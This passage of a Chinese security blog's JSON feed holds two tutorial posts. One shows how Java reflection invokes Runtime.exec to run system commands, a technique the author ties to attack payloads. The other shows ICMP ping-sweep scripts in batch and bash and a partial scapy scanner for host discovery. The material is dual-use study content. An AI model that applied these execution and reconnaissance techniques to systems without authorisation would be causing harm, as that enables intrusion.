data-num=\"34\"></td><td><pre>public demo.demo (java.lang.String,java.lang.String)</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>public demo.demo (char)</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>public demo.demo ()</pre></td></tr><tr><td data-num=\"37\"></td><td><pre>---------- 所有的构造方法 (包括：私有，受保护，默认，，公有)----------</pre></td></tr><tr><td data-num=\"38\"></td><td><pre>private demo.demo (float)</pre></td></tr><tr><td data-num=\"39\"></td><td><pre>protected demo.demo (boolean)</pre></td></tr><tr><td data-num=\"40\"></td><td><pre>public demo.demo (java.lang.String,java.lang.String)</pre></td></tr><tr><td data-num=\"41\"></td><td><pre>public demo.demo (char)</pre></td></tr><tr><td data-num=\"42\"></td><td><pre>public demo.demo ()</pre></td></tr><tr><td data-num=\"43\"></td><td><pre>demo.demo (java.lang.String)</pre></td></tr><tr><td data-num=\"44\"></td><td><pre>---------- 获取公有的、无参的构造方法 ----------</pre></td></tr><tr><td data-num=\"45\"></td><td><pre>Con = public demo.demo ()</pre></td></tr><tr><td data-num=\"46\"></td><td><pre>调用了公有，无参构造方法</pre></td></tr><tr><td data-num=\"47\"></td><td><pre>---------- 获取私有的构造方法 ----------</pre></td></tr><tr><td data-num=\"48\"></td><td><pre>demo.demo (java.lang.String)</pre></td></tr><tr><td data-num=\"49\"></td><td><pre>(默认) 的构造方法 s = admin123</pre></td></tr><tr><td data-num=\"50\"></td><td><pre>*/</span></pre></td></tr></table></figure><p>获取构造器对象方法：</p>\n<ol>\n<li>批量的方法：\n<ul>\n<li>public Constructor [] getConstructors ()：所有” 公有的” 构造方法</li>\n<li>public Constructor [] getDeclaredConstructors ()：获取所有的构造方法 (包括私有、受保护、默认公有)</li>\n</ul>\n</li>\n<li>获取单个的方法:\n<ol>\n<li>public Constructor getConstructor (Class…parameterTypes): 获取单个的” 公有的” 构造方法</li>\n<li>public Constructor getDeclaredConstructor (Class…parameterTypes): 获取” 某个构造方法” 可以是私有的，或受保护、默认、公有；</li>\n</ol>\n</li>\n</ol>\n<p>这里在记录几个常用的函数</p>\n<ol>\n<li>class.newInstance () 的作用就是调用这个类的无参构造函数</li>\n<li>getMethod 的作用是通过反射获取一个类的某个特定的公有方法。</li>\n<li>invoke 的作用是执行方法</li>\n</ol>\n<h2 id=\"反射javalangruntime\"><a class=\"anchor\" href=\"#反射javalangruntime\">#</a> 反射 java.lang.Runtime</h2>\n<p>Runtime 没法直接 new，通过下面的方式创建这个对象</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> demo <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token class-name\">Runtime</span> runtime <span class=\"token operator\">=</span> <span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token function\">getRuntime</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>runtime<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">//java.lang.Runtime@1b6d3586</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">//1b6d3586 这个是对象在内存中地址的 16 进制</span></pre></td></tr></table></figure><p>下面是常用的几种方法</p>\n<ol>\n<li>freeMemory ()：Return JVM 的空闲内存量，以字节为单位。</li>\n<li>maxMemory ()：Return JVM 试图使用的最大内存量。</li>\n<li>totalMemory ()：Return JVM 中的内存总量。</li>\n<li>availableProcessors () :Return JVM 的处理器数量</li>\n<li>exit (int status): 通过启动其关闭序列来终止当前正在运行的 JVM</li>\n</ol>\n<p>代码演示</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> demo <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token class-name\">Runtime</span> runtime <span class=\"token operator\">=</span> <span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token function\">getRuntime</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>runtime<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"JVM中的空闲内存量\"</span><span class=\"token operator\">+</span>runtime<span class=\"token punctuation\">.</span><span class=\"token function\">freeMemory</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"JVM试图使用的最大内存量\"</span><span class=\"token operator\">+</span>runtime<span class=\"token punctuation\">.</span><span class=\"token function\">maxMemory</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"JVM中内存总量\"</span><span class=\"token operator\">+</span>runtime<span class=\"token punctuation\">.</span><span class=\"token function\">totalMemory</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"JVM的处理器数量\"</span><span class=\"token operator\">+</span>runtime<span class=\"token punctuation\">.</span><span class=\"token function\">availableProcessors</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">//java.lang.Runtime@1b6d3586</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\">//        JVM 中的空闲内存量 250001304</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\">//        JVM 试图使用的最大内存量 3784310784</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">//        JVM 中内存总量 255328256</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\">//        JVM 的处理器数量 12</span></pre></td></tr></table></figure><p>这样看来 Runtime 似乎在安全方面没有太大的影响，实际上 java.lang.runtime 有一个 exec 方法可以执行本地命令，所以在很多的 payload 都会看到 Runtime 的身影，通过反射调用 Runtime 来执行本地系统命令</p>\n<p>首先是不使用反射执行本地命令</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">package</span> <span class=\"token class-name\">Clown</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">BufferedReader</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">IOException</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">InputStreamReader</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> demo <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token comment\">// 使用 Runtime 类的 exec () 方法在本地系统上执行命令</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token class-name\">Process</span> process <span class=\"token operator\">=</span> <span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token function\">getRuntime</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"cmd /c dir\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token comment\">// 使用 BufferedReader 和 InputStreamReader 读取命令的输出</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token class-name\">BufferedReader</span> reader <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">BufferedReader</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">InputStreamReader</span><span class=\"token punctuation\">(</span>process<span class=\"token punctuation\">.</span><span class=\"token function\">getInputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token comment\">// 逐行读取命令的输出，并打印到控制台上</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token class-name\">String</span> line<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>line <span class=\"token operator\">=</span> reader<span class=\"token punctuation\">.</span><span class=\"token function\">readLine</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>line<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303261401582.png\" alt=\"image-20230326140122498\" /></p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">BufferedReader</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">InputStreamReader</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span>reflect<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Method</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> demo <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token comment\">// 获取 Runtime 类的 Class 对象</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token class-name\">Class</span> <span class=\"token class-name\">RunClass</span> <span class=\"token operator\">=</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">.</span><span class=\"token function\">forName</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"java.lang.Runtime\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token comment\">// 获取 Runtime 类的 getRuntime 方法</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token class-name\">Method</span> getRuntimeMethod <span class=\"token operator\">=</span> <span class=\"token class-name\">RunClass</span><span class=\"token punctuation\">.</span><span class=\"token function\">getMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"getRuntime\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token comment\">// 调用 getRuntime 方法获取 Runtime 类的实例</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token class-name\">Object</span> runtimeObjetct <span class=\"token operator\">=</span> getRuntimeMethod<span class=\"token punctuation\">.</span><span class=\"token function\">invoke</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token comment\">// 获取 Runtime 类的 exec 方法</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token class-name\">Method</span> exec <span class=\"token operator\">=</span> <span class=\"token class-name\">RunClass</span><span class=\"token punctuation\">.</span><span class=\"token function\">getMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"exec\"</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token comment\">// 调用 exec 方法执行系统命令</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token class-name\">Process</span> process <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Process</span><span class=\"token punctuation\">)</span> exec<span class=\"token punctuation\">.</span><span class=\"token function\">invoke</span><span class=\"token punctuation\">(</span>runtimeObjetct<span class=\"token punctuation\">,</span><span class=\"token string\">\"cmd /c dir\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token comment\">// 获取进程的标准输出流</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token class-name\">BufferedReader</span> reader <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">BufferedReader</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">InputStreamReader</span><span class=\"token punctuation\">(</span>process<span class=\"token punctuation\">.</span><span class=\"token function\">getInputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token comment\">// 逐行读取命令的输出，并打印到控制台上</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token class-name\">String</span> line<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>line <span class=\"token operator\">=</span> reader<span class=\"token punctuation\">.</span><span class=\"token function\">readLine</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>line<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303261427357.png\" alt=\"image-20230326142727290\" /></p>\n",
            "tags": [
                "java安全",
                "java反射"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2023/03/20/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/",
            "url": "https://blog.xcu.icu/2023/03/20/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/",
            "title": "主动信息收集",
            "date_published": "2023-03-19T16:00:00.000Z",
            "content_html": "<h2 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h2>\n<p>主动信息收集是指与目标主机进行交互，从而获取所需要的目标信息，常见的主动信息收集包括：敏感目录，端口信息探测，系统版本，CMS 类型，服务器版本等</p>\n<h2 id=\"icmp\"><a class=\"anchor\" href=\"#icmp\">#</a> ICMP</h2>\n<p>ICMP 是网络控制报文协议，属于网络层，用于在 IP 主机，路由之间传递控制消息，尝尝被称为 “错误侦测与回报机制”，能够检测网路的连线状态，确保连线的准确性。</p>\n<h3 id=\"ping命令的功能\"><a class=\"anchor\" href=\"#ping命令的功能\">#</a> Ping 命令的功能</h3>\n<ol>\n<li>网络状态诊断：向特定的目的主机发送请求报文，测试目的站是否可达以及了解其工作状态</li>\n<li>探测主句存活：向特定的目的主机发送请求报文，如果目标主机返回应答数据包，则表达主机存活</li>\n<li>识别系统类别：向特定的目的主机发送请求报文，返回的 TTL 值可以判断目标主机系统类型</li>\n<li>查看域名对应的 ip 地址：Ping 域名，可返回该域名多对应的 ip 地址信息</li>\n</ol>\n<h3 id=\"功能概述\"><a class=\"anchor\" href=\"#功能概述\">#</a> 功能概述</h3>\n<ol>\n<li>request time out\n<ol>\n<li>目标已关机</li>\n<li>对方与自己不在同一网段内</li>\n<li>设置了 ICMP 数据包过滤</li>\n</ol>\n</li>\n<li>Destination host Unreachable\n<ol>\n<li>网线出了故障</li>\n</ol>\n</li>\n<li>Source quench received\n<ol>\n<li>表示对方或者中途服务器繁忙无法回应</li>\n</ol>\n</li>\n<li>unknown host name\n<ol>\n<li>DNS 配置不正确</li>\n<li>域名不正确</li>\n</ol>\n</li>\n<li>no rout to host\n<ol>\n<li>网卡工作不正常</li>\n</ol>\n</li>\n<li>transmit fai led，error code\n<ol>\n<li>10043 网卡驱动错误</li>\n</ol>\n</li>\n</ol>\n<p>TTL 值：Time To Live，表示 DNS 记录在 DNS 服务器上存在的时间，它是 IP 协议包的一个值，告诉路由器该数据何时需要被丢弃</p>\n<p>实际上是 Ip 数据包在计算机网络中可以转发的最大跳数 (有 IP 数据包的发送者设置)，在整个转发路径上，每经过一个路由都会修改这个 TTL 字段值，具体的做法就是减一，然后再将 IP 包转发出去</p>\n<p>通过 ping 返回的 TTL 值的大小可以粗略的判断目标主机的系统类型，默认情况下 Linux 为 64 或 255，win 系列是 128，unix 是 255</p>\n<h3 id=\"icmp主机探测\"><a class=\"anchor\" href=\"#icmp主机探测\">#</a> ICMP 主机探测</h3>\n<h3 id=\"windows-bat脚本\"><a class=\"anchor\" href=\"#windows-bat脚本\">#</a> Windows-bat 脚本</h3>\n<p>首先先记录一些 bash 语法</p>\n<ul>\n<li>echo off：关闭其他所有命令的回显</li>\n<li>@：关闭紧跟其后的一条命令的回显</li>\n<li>set/p ：在屏幕中输出信息（不换行），并接受用户输入的内容，赋值给 ip</li>\n<li>for  /L：for 循环以增量的形式从开始到结束</li>\n<li>% name%：用 % 将要调用的变量包起来就可以调用这个变量</li>\n<li>%% name：表示 name 为 for 里面的循环量</li>\n</ul>\n<p>ping 命令使用的帮助信息：</p>\n<ul>\n<li>-n：count 发送的回显请求数</li>\n<li>-l：发送缓冲区大小</li>\n<li>-w：每次等待回复的超时时间（毫秒）</li>\n</ul>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>@echo off</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token builtin class-name\">set</span> /p <span class=\"token assign-left variable\">ip</span><span class=\"token operator\">=</span><span class=\"token string\">\"请输入IP地址段，格式如：\"</span><span class=\"token number\">192.168</span>.1.<span class=\"token string\">\" >>> \"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">for</span> /L %%i <span class=\"token keyword\">in</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1,1</span>,254<span class=\"token punctuation\">)</span> <span class=\"token keyword\">do</span> <span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Ping.exe <span class=\"token parameter variable\">-n</span> <span class=\"token number\">1</span> <span class=\"token parameter variable\">-l</span> <span class=\"token number\">16</span> <span class=\"token parameter variable\">-w</span> <span class=\"token number\">100</span> %ip%%%i <span class=\"token operator\">|</span>findstr <span class=\"token assign-left variable\">TTL</span><span class=\"token operator\">=</span>  <span class=\"token operator\">></span>nul <span class=\"token operator\">&amp;&amp;</span> <span class=\"token builtin class-name\">echo</span> %ip%%%i is up. <span class=\"token operator\">||</span> <span class=\"token builtin class-name\">echo</span> %ip%%%i is down.</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token builtin class-name\">echo</span> 检测ping完成！<span class=\"token operator\">&amp;</span> pause</pre></td></tr></table></figure><h3 id=\"linux-shell\"><a class=\"anchor\" href=\"#linux-shell\">#</a> Linux-shell</h3>\n<p>还是先记录用到的一些写法</p>\n<ul>\n<li>/bin/bash：利用 /bin/bash 执行 shell 脚本</li>\n<li>read：用于读取用户输入的字符</li>\n<li>for：for 循环以增量形式从开始到结束</li>\n</ul>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token shebang important\">#!/bin/bash</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$ip</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token builtin class-name\">read</span> <span class=\"token parameter variable\">-p</span> <span class=\"token string\">\"please inpur ip :\"</span> <span class=\"token function\">ip</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">for</span><span class=\"token variable\"><span class=\"token punctuation\">((</span>i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;=</span><span class=\"token number\">255</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">))</span></span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">do</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token function\">ping</span> <span class=\"token parameter variable\">-c</span> <span class=\"token number\">1</span> <span class=\"token parameter variable\">-W</span> <span class=\"token number\">0.1</span>   <span class=\"token variable\">$ip</span><span class=\"token variable\">$i</span> <span class=\"token operator\">></span> /dev/null <span class=\"token operator\">&amp;&amp;</span> <span class=\"token builtin class-name\">echo</span> <span class=\"token string\">\"<span class=\"token variable\">$ip</span><span class=\"token variable\">$i</span> is up.\"</span> <span class=\"token operator\">||</span> <span class=\"token builtin class-name\">echo</span> <span class=\"token string\">\"<span class=\"token variable\">$ip</span><span class=\"token variable\">$i</span> is down.\"</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">done</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token string\">\"检测ping完成\"</span></pre></td></tr></table></figure><h3 id=\"python代码实现\"><a class=\"anchor\" href=\"#python代码实现\">#</a> python 代码实现</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">#coding:utf-8</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> scapy<span class=\"token punctuation\">.</span><span class=\"token builtin\">all</span> <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">from</span> random <span class=\"token keyword\">import</span> randint</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">from</span> optparse <span class=\"token keyword\">import</span> OptionParser</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">Scan</span><span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    ip_id <span class=\"token operator\">=</span> randint<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">65535</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    icmp_id <span class=\"token operator\">=</span> randint<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">65535</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    icmp_seq <span class=\"token operator\">=</span> randint<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">65535</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    packet<span class=\"token operator\">=</span>IP<span class=\"token punctuation\">(</span>dst<span class=\"token operator\">=</span>ip<span class=\"token punctuation\">,</span>ttl<span class=\"token operator\">=</span><span class=\"token number\">64</span><span class=\"token punctuation\">,</span><span class=\"token 